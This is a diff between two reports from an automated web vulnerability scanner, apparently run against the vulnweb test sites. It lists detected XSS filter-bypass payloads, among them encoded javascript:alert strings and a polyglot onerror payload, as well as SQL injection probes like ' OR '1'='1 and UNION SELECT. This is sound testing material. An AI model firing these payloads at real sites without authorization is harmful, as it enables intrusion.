@@ -1,4 +1,4 @@
-Scan for 'testphp.vulnweb.com' Started at 2025-02-06 04:10:39.046349
+Scan for 'testhtml5.vulnweb.com' Started at 2025-02-06 21:20:47.489144
 
 =====
 
@@ -6,13 +6,24 @@ Scan for 'testphp.vulnweb.com' Started at 2025-02-06 04:10:39.046349
 
   - Port 80 is OPEN
 
+[+] Performing DNS Enumeration...
+
+
+[+] Checking for Directory Traversal Vulnerabilities...
+
+
 [+] Checking SSL Certificate...
 
   - Port 443 is CLOSED. Skipping SSL Check.
 
-[+] Checking HTTP Headers...
+[+] Checking HTTP(S) Headers...
 
-  - Port 443 is CLOSED. Skipping HTTPS Headers Check.
+  - Server: nginx/1.19.0
+  - Date: Thu, 06 Feb 2025 16:00:20 GMT
+  - Content-Type: text/html; charset=utf-8
+  - Content-Length: 6940
+  - Connection: keep-alive
+  - Access-Control-Allow-Origin: *
 
 [+] Checking for Cross-site Scripting Vulnerabilities...
 
@@ -32,10 +43,6 @@ Scan for 'testphp.vulnweb.com' Started at 2025-02-06 04:10:39.046349
     Path: /?q=javascript%3Aalert%28%27XSS%27%29
     Method: GET
     Payload: javascript:alert('XSS')
-  - Potential Filter Bypass Found!
-    Path: /?q=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B
-    Method: GET
-    Payload: &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
   - Potential Filter Bypass Found!
     Path: /?q=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D
     Method: GET
@@ -84,10 +91,6 @@ Scan for 'testphp.vulnweb.com' Started at 2025-02-06 04:10:39.046349
     Path: /?q=%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/script%3E
     Method: GET
     Payload: ><script>alert(String.fromCharCode(88,83,83))</script>
-  - Potential Filter Bypass Found!
-    Path: /?q=javascript%3A/%2A-/%2A%60/%2A%5C%60/%2A%27/%2A%22/%2A%2A/%28/%2A%20%2A/onerror%3Dalert%28%27XSS%27%29%20%29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--%21%3E%5Cx3csVg/%3CsVg/oNloAd%3Dalert%28%27XSS%27%29//%3E%3E
-    Method: GET
-    Payload: javascript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>>
 
 [+] Checking for Basic Cross-Site Request Forgery...
 
@@ -95,21 +98,8 @@ Scan for 'testphp.vulnweb.com' Started at 2025-02-06 04:10:39.046349
 
 [+] Checking for Basic SQL Injection Vulnerabilities...
 
-  - Potential SQL Injection Found with Payload: ' OR '1'='1
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: 1' OR '1'='1
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: 1 OR 1=1
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: ' --
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: 1' --
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: ' UNION SELECT NULL--
-  - Detected Database Error Pattern: sql
-  - Potential SQL Injection Found with Payload: admin' --
-  - Detected Database Error Pattern: sql
+  - No Obvious SQL Injection Vulnerabilities Detected.
 
 =====
 
-Scanning Completed at 2025-02-06 04:21:16.389184
+Scanning Completed at 2025-02-06 21:33:37.771875
